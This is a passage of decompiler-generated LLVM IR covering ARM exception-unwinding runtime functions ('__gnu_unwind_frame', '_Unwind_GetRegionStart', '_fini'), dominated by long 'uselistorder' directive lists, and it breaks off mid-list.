  uselistorder i32* @r6, { 473, 474, 475, 486, 476, 27, 477, 4, 478, 479, 5, 480, 481, 482, 483, 484, 485, 487, 0, 488, 489, 95, 96, 93, 94, 97, 490, 491, 6, 492, 493, 494, 495, 80, 81, 98, 7, 99, 100, 101, 102, 103, 23, 104, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 78, 79, 82, 83, 84, 85, 9, 86, 87, 88, 10, 89, 90, 91, 92, 119, 28, 120, 24, 11, 12, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 462, 463, 464, 465, 498, 466, 13, 467, 468, 75, 14, 76, 15, 77, 496, 497, 415, 419, 420, 421, 422, 416, 417, 418, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 423, 448, 449, 450, 424, 425, 426, 427, 428, 16, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 444, 446, 440, 441, 442, 443, 445, 447, 132, 133, 1, 134, 31, 373, 374, 335, 336, 337, 338, 339, 328, 329, 135, 136, 137, 138, 139, 340, 341, 342, 343, 344, 140, 141, 142, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 143, 144, 145, 146, 147, 148, 149, 150, 232, 17, 233, 234, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 38, 165, 166, 167, 168, 32, 169, 170, 171, 62, 172, 52, 63, 64, 65, 66, 67, 33, 34, 35, 53, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 54, 55, 56, 57, 58, 59, 60, 61, 68, 69, 70, 71, 72, 73, 74, 173, 174, 175, 3, 2, 176, 177, 178, 179, 180, 181, 182, 25, 183, 184, 185, 186, 187, 194, 195, 196, 197, 198, 188, 189, 190, 191, 192, 193, 244, 245, 246, 247, 199, 200, 201, 202, 203, 204, 205, 209, 206, 207, 208, 18, 210, 211, 212, 213, 214, 215, 216, 217, 235, 236, 237, 238, 26, 239, 240, 241, 19, 242, 243, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 29, 20, 287, 288, 290, 291, 289, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 330, 331, 332, 333, 334, 345, 346, 30, 21, 347, 348, 350, 351, 349, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 22, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 469, 470, 471, 472 }
  uselistorder label %dec_label_pc_19158, { 1, 0 }
  uselistorder label %dec_label_pc_190f4, { 1, 0 }
  uselistorder label %dec_label_pc_190a0, { 1, 0 }
  uselistorder label %dec_label_pc_19078, { 1, 0 }
  uselistorder label %dec_label_pc_18fe4, { 1, 0 }
  uselistorder label %dec_label_pc_18fc8, { 1, 0 }
  uselistorder label %dec_label_pc_18fac, { 1, 0 }
  uselistorder label %dec_label_pc_18f5c, { 1, 0 }
  uselistorder label %dec_label_pc_18f40, { 1, 0 }
  uselistorder label %dec_label_pc_18ebc, { 1, 0 }
  uselistorder label %dec_label_pc_18ea0, { 1, 0 }
  uselistorder label %dec_label_pc_18ddc, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_18dac, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_18d94, { 1, 0 }
  uselistorder label %dec_label_pc_18d78, { 1, 0 }
  uselistorder label %dec_label_pc_18adc.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_18c04, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_18bf8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18bec, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_18b9c, { 1, 0 }
  uselistorder label %dec_label_pc_18b8c, { 1, 0 }
  uselistorder label %dec_label_pc_18b18, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_191e0 = add i32 %ucbp, 76
  %v2_191e0 = inttoptr i32 %v1_191e0 to i32*
  %v3_191e0 = load i32, i32* %v2_191e0, align 4
  %v1_191e4 = add i32 %v3_191e0, 4
  %v2_191e4 = inttoptr i32 %v1_191e4 to i32*
  %v3_191e4 = load i32, i32* %v2_191e4, align 4
  %v3_191ec = mul i32 %v3_191e4, 256
  %v4_191f4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_191ec, i32* %v4_191f4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_19214 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_19214

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 306, 295, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 287, 296, 293, 294, 50, 52, 51, 53, 286, 54, 55, 56, 0, 292, 1, 57, 58, 59, 60, 62, 63, 64, 61, 66, 67, 68, 65, 69, 290, 70, 297, 298, 71, 72, 73, 300, 74, 75, 76, 77, 78, 79, 80, 81, 82, 85, 84, 83, 86, 291, 301, 299, 87, 88, 89, 90, 91, 92, 94, 93, 95, 97, 96, 98, 302, 99, 303, 108, 103, 109, 104, 105, 100, 101, 110, 106, 102, 107, 111, 112, 113, 114, 115, 116, 117, 124, 121, 125, 122, 126, 123, 118, 119, 120, 127, 128, 129, 130, 140, 136, 131, 141, 137, 142, 138, 132, 133, 134, 143, 139, 135, 144, 145, 146, 147, 148, 149, 2, 150, 3, 159, 155, 160, 156, 151, 152, 153, 161, 157, 162, 158, 154, 163, 164, 165, 166, 167, 177, 178, 172, 179, 173, 168, 169, 174, 180, 175, 181, 176, 170, 171, 182, 183, 184, 185, 190, 188, 186, 191, 189, 187, 192, 193, 195, 197, 198, 196, 194, 199, 288, 304, 200, 202, 201, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 217, 215, 213, 218, 216, 214, 219, 220, 222, 224, 225, 223, 221, 226, 289, 305, 227, 229, 228, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 4, 242, 247, 254, 248, 255, 249, 243, 244, 256, 250, 245, 251, 257, 252, 246, 253, 258, 259, 260, 261, 262, 263, 268, 275, 269, 276, 270, 264, 265, 277, 271, 266, 272, 278, 273, 267, 274, 279, 280, 281, 282, 283, 284, 285 }
  uselistorder i32 4, { 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 105, 500, 501, 502, 503, 504, 4, 507, 508, 505, 506, 509, 5, 510, 511, 512, 513, 6, 530, 7, 514, 515, 516, 517, 518, 8, 519, 9, 520, 521, 522, 523, 524, 525, 526, 10, 527, 142, 528, 529, 531, 532, 533, 534, 11, 535, 12, 252, 253, 254, 255, 271, 272, 536, 233, 234, 432, 239, 256, 13, 14, 539, 15, 16, 88, 83, 84, 17, 540, 85, 541, 70, 18, 19, 86, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 20, 559, 560, 561, 562, 563, 564, 69, 565, 566, 567, 568, 569, 570, 21, 22, 87, 571, 264, 106, 262, 263, 257, 258, 259, 260, 261, 235, 236, 237, 238, 240, 241, 242, 243, 244, 245, 23, 246, 107, 247, 248, 249, 250, 251, 143, 265, 266, 267, 268, 269, 270, 24, 273, 274, 275, 276, 312, 313, 277, 278, 279, 572, 25, 144, 108, 145, 574, 26, 575, 146, 232, 573, 80, 483, 484, 485, 486, 147, 71, 436, 437, 438, 439, 440, 441, 148, 149, 27, 442, 443, 444, 445, 446, 447, 448, 449, 150, 434, 435, 407, 408, 409, 410, 411, 412, 413, 414, 415, 28, 416, 417, 418, 450, 29, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 151, 152, 153, 465, 466, 469, 472, 467, 468, 109, 154, 470, 62, 471, 473, 474, 475, 477, 155, 31, 30, 476, 156, 157, 158, 280, 32, 33, 34, 159, 63, 35, 36, 314, 315, 316, 317, 318, 37, 319, 72, 537, 538, 205, 38, 39, 110, 281, 73, 282, 114, 283, 115, 225, 116, 226, 117, 227, 284, 285, 40, 286, 89, 111, 112, 218, 219, 228, 229, 113, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 224, 230, 231, 65, 64, 287, 81, 288, 41, 289, 42, 67, 66, 291, 43, 290, 292, 293, 298, 118, 300, 119, 301, 120, 302, 303, 299, 294, 121, 295, 296, 297, 393, 304, 79, 78, 77, 305, 122, 44, 45, 46, 47, 48, 49, 306, 75, 74, 307, 76, 123, 308, 309, 310, 124, 311, 50, 320, 321, 322, 160, 323, 324, 325, 326, 161, 162, 125, 327, 126, 328, 90, 329, 330, 331, 163, 332, 333, 164, 165, 334, 91, 335, 92, 336, 337, 166, 338, 339, 167, 168, 340, 127, 341, 93, 342, 169, 170, 171, 343, 344, 128, 94, 345, 346, 172, 347, 348, 349, 173, 174, 0, 129, 350, 95, 351, 352, 353, 175, 354, 355, 176, 177, 1, 130, 356, 96, 357, 97, 358, 359, 360, 361, 178, 362, 363, 179, 180, 364, 365, 131, 366, 2, 367, 98, 368, 132, 369, 370, 371, 372, 181, 373, 374, 182, 183, 375, 376, 133, 377, 3, 378, 99, 379, 134, 380, 184, 185, 186, 381, 382, 135, 100, 383, 384, 385, 386, 187, 387, 388, 188, 189, 137, 389, 136, 390, 101, 391, 102, 392, 394, 395, 396, 397, 398, 139, 399, 140, 400, 190, 401, 68, 402, 191, 192, 141, 403, 138, 404, 103, 405, 104, 406, 193, 51, 419, 194, 52, 420, 195, 53, 421, 196, 54, 422, 197, 55, 423, 198, 82, 56, 424, 425, 199, 57, 426, 200, 58, 427, 201, 59, 428, 202, 60, 429, 203, 61, 430, 431, 433, 478, 479, 480, 481, 482, 487, 204, 488, 489 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 728, 1288, 1289, 562, 1293, 1294, 1295, 1296, 603, 1297, 1298, 527, 542, 604, 1290, 1291, 1292, 1299, 563, 1300, 729, 370, 375, 373, 371, 376, 372, 374, 730, 731, 732, 733, 605, 606, 1301, 1302, 514, 736, 735, 734, 118, 119, 121, 120, 122, 117, 739, 738, 737, 86, 607, 608, 85, 1303, 78, 1304, 742, 741, 740, 309, 1305, 1306, 1307, 1308, 744, 743, 150, 152, 153, 151, 154, 82, 83, 519, 745, 390, 1003, 746, 391, 392, 393, 747, 84, 1004, 1005, 1006, 147, 146, 148, 149, 748, 65, 749, 54, 51, 52, 50, 53, 750, 568, 976, 115, 116, 114, 137, 136, 1309, 543, 609, 1310, 1, 0, 751, 100, 95, 93, 94, 101, 98, 99, 96, 97, 92, 44, 610, 280, 752, 395, 396, 394, 528, 561, 529, 1232, 1233, 1234, 1235, 544, 753, 397, 755, 754, 398, 399, 982, 756, 1007, 1008, 1009, 1312, 1011, 1010, 515, 757, 532, 1012, 533, 1313, 978, 977, 1314, 534, 1315, 1316, 1317, 1318, 1319, 1320, 941, 1321, 1322, 1323, 1324, 1325, 1326, 942, 722, 759, 758, 400, 404, 406, 402, 401, 403, 405, 407, 409, 408, 1016, 1013, 1014, 1015, 558, 535, 190, 191, 193, 192, 611, 1017, 1018, 1033, 1034, 760, 723, 42, 43, 1025, 943, 1026, 1027, 944, 1028, 1029, 1030, 1031, 1032, 327, 321, 322, 324, 328, 325, 323, 326, 320, 329, 1019, 1020, 1021, 612, 1022, 1023, 1024, 761, 480, 483, 481, 478, 486, 479, 485, 482, 484, 1035, 1036, 1037, 762, 170, 169, 165, 164, 163, 168, 166, 167, 171, 1038, 1039, 1040, 1041, 763, 274, 275, 273, 276, 277, 278, 764, 162, 980, 613, 979, 559, 767, 766, 765, 488, 491, 487, 489, 496, 490, 495, 494, 492, 493, 614, 981, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 536, 768, 498, 497, 499, 500, 501, 503, 502, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 769, 66, 70, 73, 69, 67, 71, 68, 72, 615, 993, 770, 87, 1042, 1043, 1044, 1045, 1046, 616, 771, 28, 29, 31, 30, 32, 617, 20, 772, 27, 26, 23, 24, 25, 21, 22, 773, 10, 11, 18, 19, 14, 15, 16, 17, 12, 13, 774, 308, 306, 307, 775, 410, 776, 89, 88, 777, 331, 330, 778, 145, 144, 779, 1108, 138, 141, 139, 140, 411, 112, 113, 780, 108, 107, 781, 351, 782, 783, 142, 143, 1327, 1328, 1329, 618, 1330, 1331, 619, 1332, 786, 785, 784, 55, 57, 63, 56, 61, 60, 64, 62, 58, 59, 787, 109, 620, 788, 412, 413, 414, 789, 420, 418, 419, 417, 415, 416, 790, 126, 127, 125, 128, 124, 791, 792, 45, 794, 793, 389, 795, 123, 1281, 798, 797, 796, 110, 111, 799, 347, 349, 348, 350, 537, 800, 281, 512, 516, 1282, 801, 133, 130, 131, 132, 134, 129, 1283, 1284, 1285, 802, 422, 421, 426, 429, 428, 427, 424, 430, 423, 431, 425, 102, 520, 973, 974, 975, 803, 804, 530, 1086, 531, 1087, 1088, 521, 1089, 433, 437, 432, 435, 436, 439, 440, 438, 434, 1090, 1333, 545, 621, 806, 805, 807, 1237, 1240, 1241, 1242, 808, 441, 446, 447, 445, 444, 448, 442, 443, 1243, 1244, 1245, 1246, 809, 453, 459, 452, 458, 457, 451, 461, 460, 455, 449, 454, 450, 456, 1238, 1239, 622, 810, 344, 346, 345, 135, 1221, 623, 1222, 1223, 1224, 1225, 1226, 811, 303, 304, 302, 305, 1247, 158, 157, 1248, 1249, 1250, 1251, 1252, 1253, 569, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 625, 1262, 1263, 1264, 1265, 1266, 624, 1267, 1268, 1269, 1270, 1271, 812, 464, 466, 462, 465, 470, 472, 469, 471, 473, 467, 468, 463, 311, 310, 626, 627, 525, 816, 815, 814, 813, 195, 343, 538, 279, 817, 354, 353, 818, 378, 377, 819, 194, 820, 474, 821, 822, 475, 823, 388, 824, 476, 825, 826, 477, 827, 226, 225, 828, 156, 155, 829, 199, 198, 830, 831, 509, 832, 181, 180, 833, 510, 834, 1135, 1136, 74, 75, 946, 947, 948, 949, 950, 951, 952, 1334, 103, 104, 105, 106, 835, 1109, 628, 76, 77, 1047, 836, 296, 295, 629, 1110, 837, 90, 91, 630, 838, 249, 247, 248, 1111, 839, 81, 80, 79, 840, 298, 297, 841, 842, 197, 196, 843, 207, 844, 504, 845, 228, 846, 272, 271, 847, 159, 849, 848, 238, 239, 851, 850, 160, 161, 254, 513, 1311, 224, 223, 1112, 1113, 1114, 1115, 518, 1116, 853, 852, 41, 39, 35, 38, 36, 37, 33, 34, 40, 2, 1091, 1092, 1093, 1094, 1137, 539, 1138, 540, 1139, 855, 854, 505, 1117, 1118, 1119, 1120, 856, 1228, 1229, 546, 3, 517, 4, 1230, 1048, 1049, 1050, 631, 1121, 506, 1272, 342, 1123, 1122, 1124, 47, 1140, 1155, 857, 203, 202, 201, 200, 1141, 858, 258, 257, 256, 255, 643, 1051, 644, 1052, 570, 1053, 645, 971, 1054, 633, 1055, 548, 646, 647, 956, 953, 635, 526, 954, 955, 636, 957, 958, 959, 637, 960, 961, 640, 962, 963, 638, 964, 965, 639, 634, 966, 967, 968, 641, 969, 970, 642, 972, 1056, 1057, 1058, 648, 1059, 1060, 1061, 649, 547, 1062, 945, 1065, 1064, 632, 1063, 1066, 1067, 650, 1068, 1069, 1070, 549, 1077, 1078, 522, 651, 724, 870, 869, 868, 867, 866, 865, 864, 863, 862, 861, 860, 859, 384, 383, 382, 387, 381, 385, 386, 1071, 1072, 652, 1073, 1074, 653, 1075, 1076, 365, 364, 363, 369, 366, 367, 368, 362, 361, 654, 655, 872, 871, 507, 508, 1213, 555, 541, 873, 340, 339, 338, 337, 341, 335, 333, 332, 334, 336, 1142, 875, 874, 292, 293, 291, 290, 289, 288, 294, 658, 571, 1079, 1080, 572, 1081, 1082, 656, 657, 659, 1083, 1084, 660, 661, 662, 663, 664, 665, 666, 888, 887, 886, 885, 884, 883, 882, 881, 880, 879, 727, 878, 877, 876, 299, 301, 300, 667, 523, 668, 889, 669, 670, 671, 674, 673, 672, 1085, 891, 890, 204, 675, 1095, 557, 1096, 556, 1097, 1098, 676, 560, 677, 1099, 678, 1100, 679, 1101, 680, 1102, 681, 1103, 682, 1104, 683, 1105, 684, 1106, 685, 1107, 524, 686, 901, 900, 899, 898, 897, 896, 895, 894, 893, 892, 250, 252, 251, 253, 1125, 1131, 6, 550, 1126, 687, 1127, 5, 1128, 564, 1129, 551, 552, 1130, 1132, 1133, 565, 1134, 725, 905, 904, 726, 903, 902, 227, 1214, 573, 574, 1215, 7, 8, 9, 1143, 1144, 1145, 1146, 1147, 566, 567, 688, 1148, 1149, 689, 1150, 1151, 690, 1152, 1154, 1153, 909, 908, 907, 906, 210, 212, 214, 215, 213, 208, 211, 209, 1156, 1157, 1158, 691, 692, 911, 910, 356, 359, 360, 355, 358, 357, 1159, 1160, 1161, 693, 1162, 694, 576, 575, 695, 1163, 912, 174, 177, 178, 179, 176, 172, 175, 173, 1164, 1165, 696, 1166, 577, 553, 697, 913, 379, 380, 1167, 1168, 1169, 698, 1170, 699, 700, 1171, 578, 1172, 914, 183, 187, 188, 189, 186, 182, 185, 184, 1173, 1174, 1175, 701, 1176, 702, 580, 579, 703, 1177, 704, 1178, 915, 263, 269, 270, 267, 268, 262, 266, 264, 265, 1179, 1180, 1181, 1182, 1183, 705, 1184, 706, 1185, 707, 585, 584, 708, 1186, 581, 1187, 582, 1188, 583, 1189, 921, 920, 919, 918, 917, 916, 219, 220, 222, 221, 216, 218, 217, 1190, 1191, 1192, 1193, 1194, 709, 1195, 710, 1196, 711, 594, 593, 712, 1197, 592, 1198, 591, 1199, 586, 1200, 587, 1201, 588, 1202, 589, 1203, 590, 1204, 927, 926, 925, 924, 923, 922, 243, 244, 246, 245, 240, 242, 241, 1205, 1206, 713, 1207, 595, 554, 714, 928, 205, 206, 1208, 1209, 1210, 715, 598, 597, 716, 1211, 596, 1212, 929, 319, 312, 316, 317, 318, 315, 314, 313, 1216, 1217, 1218, 717, 601, 600, 718, 1219, 599, 1220, 934, 933, 932, 931, 930, 229, 230, 235, 236, 237, 234, 233, 232, 231, 1227, 602, 719, 935, 259, 260, 261, 1231, 936, 49, 1236, 937, 48, 1273, 1276, 720, 1277, 1278, 1274, 1275, 1279, 1280, 283, 284, 286, 285, 282, 287, 1286, 721, 938, 352, 1287, 46, 939, 940, 511 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19240 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19248 = add i32 %tmp1, 72
  %v2_19248 = inttoptr i32 %v1_19248 to i32*
  %v3_19248 = load i32, i32* %v2_19248, align 4
  ret i32 %v3_19248

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 0, 1 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 176, 177, 178, 179, 14, 15, 66, 16, 180, 58, 11, 181, 182, 183, 184, 185, 187, 188, 186, 189, 190, 191, 192, 193, 194, 195, 17, 18, 19, 20, 22, 21, 23, 59, 60, 24, 25, 61, 62, 63, 64, 65, 67, 68, 92, 69, 70, 196, 5, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 3, 130, 131, 132, 133, 134, 26, 135, 153, 27, 28, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 172, 165, 166, 167, 168, 169, 170, 171, 173, 174, 29, 175, 4, 93, 94, 30, 95, 96, 97, 31, 71, 72, 73, 45, 74, 42, 75, 53, 43, 44, 46, 47, 48, 49, 50, 51, 52, 55, 32, 54, 33, 56, 34, 57, 76, 77, 78, 6, 79, 80, 81, 82, 84, 85, 41, 86, 35, 87, 36, 88, 37, 89, 91, 90, 83, 125, 98, 38, 99, 100, 101, 102, 103, 104, 105, 39, 106, 107, 108, 40, 109, 110, 111, 112, 113, 114, 12, 115, 116, 117, 118, 119, 120, 13, 121, 122, 123, 124, 126, 127, 128, 129, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1925c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1925c)
  %v31_19264 = load i32, i32* @r0, align 4
  ret i32 %v31_19264

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 243, 244, 245, 16, 43, 80, 91, 246, 249, 250, 71, 17, 247, 248, 225, 46, 8, 251, 9, 18, 81, 0, 82, 10, 11, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 1, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 83, 42, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 19, 241, 20, 242, 21, 22, 23, 24, 167, 168, 278, 279, 281, 59, 60, 61, 62, 25, 191, 192, 2, 26, 27, 93, 94, 3, 28, 29, 282, 283, 4, 30, 31, 211, 212, 5, 32, 33, 68, 69, 280, 152, 92, 227, 34, 56, 57, 228, 6, 229, 230, 231, 219, 54, 220, 221, 222, 55, 223, 224, 35, 239, 232, 233, 234, 235, 236, 237, 238, 95, 96, 36, 213, 37, 214, 205, 38, 206, 201, 39, 202, 97, 40, 98, 207, 41, 208, 99, 49, 100, 101, 50, 44, 169, 170, 171, 172, 102, 45, 103, 47, 48, 173, 174, 175, 176, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 65, 66, 137, 63, 64, 67, 138, 141, 142, 143, 144, 145, 146, 139, 140, 52, 147, 148, 149, 150, 151, 70, 153, 154, 53, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 177, 178, 179, 180, 181, 182, 183, 12, 184, 185, 186, 187, 188, 189, 190, 215, 216, 7, 193, 194, 195, 196, 197, 198, 199, 200, 203, 204, 209, 210, 217, 218, 226, 240, 58, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 2, 69, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 18, 19, 20, 21, 22, 23, 14, 15, 16, 17, 24, 25, 26, 27, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 28, 29, 30, 74, 79, 80, 81, 82, 83, 84, 85, 75, 89, 90, 91, 92, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 40, 76, 77, 78, 86, 87, 88, 41, 42, 43, 0, 37, 38, 39, 44, 48, 49, 45, 46, 47, 1, 93, 31, 32, 33, 34, 35, 36, 60, 61 }
  uselistorder i32 0, { 419, 418, 482, 483, 1360, 423, 422, 484, 1361, 1362, 1363, 1364, 371, 370, 485, 1365, 1366, 201, 1367, 1369, 1370, 146, 147, 1371, 1372, 1368, 93, 94, 95, 96, 2, 1, 3, 0, 190, 189, 191, 192, 193, 1373, 420, 421, 140, 135, 1374, 1375, 195, 196, 194, 197, 1376, 1377, 1378, 1379, 200, 199, 198, 1380, 1381, 1382, 410, 409, 486, 424, 487, 425, 488, 426, 489, 490, 491, 148, 1383, 440, 439, 1384, 1385, 438, 437, 1386, 492, 435, 436, 433, 434, 432, 431, 1387, 430, 429, 428, 427, 378, 1388, 1404, 1389, 204, 1390, 1391, 1392, 1393, 1394, 1395, 206, 1397, 1398, 202, 203, 1399, 1400, 126, 149, 1401, 1402, 676, 97, 98, 411, 412, 205, 1396, 1403, 377, 1405, 493, 494, 1406, 442, 441, 207, 1407, 1408, 208, 1409, 1410, 1411, 109, 495, 496, 1412, 209, 1413, 150, 1414, 1415, 210, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 38, 127, 497, 1426, 211, 1427, 1428, 1429, 4, 1430, 1431, 5, 1432, 1433, 890, 891, 6, 141, 1434, 498, 1435, 804, 805, 806, 807, 808, 812, 809, 810, 811, 7, 379, 99, 813, 499, 814, 815, 816, 443, 444, 892, 893, 8, 500, 749, 501, 1436, 1437, 1438, 9, 10, 151, 152, 153, 1453, 1454, 11, 750, 154, 155, 1270, 1271, 1272, 1273, 212, 213, 1274, 759, 214, 128, 48, 1455, 100, 380, 1459, 1460, 49, 817, 110, 818, 819, 820, 381, 156, 1456, 1457, 1458, 382, 12, 1461, 1462, 1463, 1464, 1465, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1466, 1467, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 39, 1486, 1487, 1488, 1489, 1490, 40, 1491, 1492, 1493, 41, 1494, 1495, 1496, 42, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1521, 1522, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 43, 1540, 1541, 1542, 1543, 1544, 44, 1545, 1546, 1547, 1548, 1549, 45, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 215, 821, 677, 822, 823, 824, 825, 859, 502, 503, 860, 861, 157, 158, 159, 219, 826, 217, 827, 848, 841, 678, 842, 843, 844, 845, 50, 51, 113, 846, 847, 383, 849, 850, 679, 851, 216, 852, 52, 53, 112, 853, 854, 680, 855, 856, 54, 55, 111, 857, 218, 858, 160, 828, 681, 829, 830, 504, 831, 832, 682, 833, 834, 837, 835, 836, 384, 838, 56, 57, 115, 839, 683, 58, 59, 114, 840, 862, 684, 863, 864, 865, 866, 867, 868, 685, 869, 870, 871, 872, 752, 751, 387, 754, 755, 753, 385, 386, 756, 757, 505, 758, 760, 761, 686, 762, 763, 764, 687, 765, 766, 60, 61, 116, 767, 768, 769, 101, 102, 770, 771, 772, 220, 773, 774, 775, 776, 777, 506, 778, 779, 780, 781, 782, 783, 161, 786, 688, 787, 788, 62, 63, 118, 789, 790, 791, 689, 792, 793, 794, 795, 690, 796, 797, 64, 65, 117, 798, 799, 800, 801, 802, 221, 223, 784, 222, 785, 224, 803, 162, 873, 878, 879, 874, 875, 876, 881, 882, 883, 225, 884, 885, 886, 887, 888, 877, 880, 889, 163, 894, 895, 896, 507, 1009, 508, 897, 1439, 1440, 1441, 226, 1442, 1335, 1334, 1278, 1251, 1180, 899, 898, 900, 1010, 1011, 1012, 1565, 1566, 1567, 1568, 227, 1569, 1570, 1571, 1279, 1280, 407, 408, 509, 1576, 694, 1577, 510, 1578, 1579, 511, 1580, 1581, 692, 228, 389, 1582, 693, 1583, 512, 103, 1584, 1585, 513, 1600, 1601, 1604, 691, 388, 1605, 445, 165, 164, 1602, 1603, 1572, 1573, 695, 229, 372, 740, 13, 14, 1596, 1053, 904, 1595, 1229, 1336, 136, 231, 1337, 696, 230, 1338, 1339, 1586, 1587, 1588, 1589, 514, 1590, 166, 983, 984, 66, 67, 119, 1340, 1341, 108, 391, 1345, 1342, 1343, 697, 1344, 1346, 698, 1347, 1348, 1349, 1350, 68, 69, 120, 1351, 232, 1352, 1353, 1354, 1356, 1355, 390, 741, 743, 742, 233, 744, 745, 746, 515, 747, 167, 1574, 1575, 985, 986, 987, 988, 989, 990, 235, 168, 991, 992, 993, 137, 234, 994, 169, 517, 518, 1591, 516, 170, 171, 1286, 1287, 1288, 1289, 1290, 236, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 237, 1281, 519, 1282, 1283, 520, 1284, 1285, 172, 699, 238, 239, 1252, 521, 240, 1253, 1254, 1255, 1256, 1257, 249, 241, 243, 246, 242, 248, 250, 244, 247, 245, 1298, 1299, 1323, 1324, 173, 1300, 1301, 254, 252, 253, 1302, 1303, 260, 259, 185, 251, 1304, 1305, 1306, 1307, 1308, 1309, 414, 413, 446, 522, 1310, 1311, 1312, 104, 1313, 256, 255, 257, 258, 184, 1314, 1315, 392, 1316, 1317, 144, 1318, 1319, 1320, 1321, 1322, 15, 16, 